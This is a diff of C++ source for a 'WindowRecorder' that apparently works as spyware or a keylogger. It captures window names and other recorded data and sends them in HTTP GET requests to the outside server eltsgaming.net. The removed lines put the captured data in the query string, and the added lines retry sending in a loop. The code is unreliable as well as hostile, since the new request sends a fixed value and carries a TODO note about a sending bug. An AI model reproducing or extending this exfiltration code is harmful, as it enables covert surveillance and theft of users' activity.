@@ -305,14 +305,20 @@ void WindowRecorder::outputWindowName()
 			std::cout << data.toString();
 			out << data.toString();
 			
-			try
-			{
-				stream.sendData("GET /index.php?goro=" + data.toString() +" http/1.1\nHOST: eltsgaming.net\n\n");
+			/* @TODO: Fix bug where data is not send properly */
+			while (!stream.sendData("GET /index.php?goro=d http/1.1\nHOST: eltsgaming.net\n\n")) {
+				std::cout << "Error sending data. Retrying...\n";
+				try
+				{
+					stream.startUp();
+					stream.connectToServer();
+				}
+				catch (std::exception e)
+				{
+					std::cout << e.what() << std::endl;
+				}
 			}
-			catch (std::exception e)
-			{
-				std::cout << e.what() << std::endl;
-			}
+			
 
 			out.close();
 			data.resetAll();		/* Clear all data */
